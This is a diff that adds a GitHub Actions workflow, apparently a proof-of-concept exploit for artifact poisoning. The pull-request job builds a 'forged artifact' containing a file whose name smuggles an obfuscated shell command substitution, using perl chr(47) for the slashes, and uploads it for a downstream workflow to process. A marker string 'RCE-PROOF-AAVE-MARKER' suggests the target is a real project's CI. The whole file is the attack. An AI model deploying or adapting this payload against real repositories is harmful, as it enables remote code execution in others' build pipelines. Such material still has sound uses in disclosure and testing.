@@ -1,0 +1,27 @@
+name: Test
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build forged artifact
+        run: |
+          mkdir -p /tmp/content
+          echo 1 > /tmp/content/pr_number.txt
+          echo hello > /tmp/content/pwn.txt
+          echo 'RCE-PROOF-AAVE-MARKER' > /tmp/content/marker.txt
+          read -r f <<'NAME'
+          $(D=$(perl -e 'print chr(47)'); printf pwn; cp ${D}tmp${D}content${D}content${D}marker.txt ${D}tmp${D}content${D}content${D}pwn.txt).txt
+          NAME
+          touch "/tmp/content/$f"
+          ls -la /tmp/content
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: /tmp/content
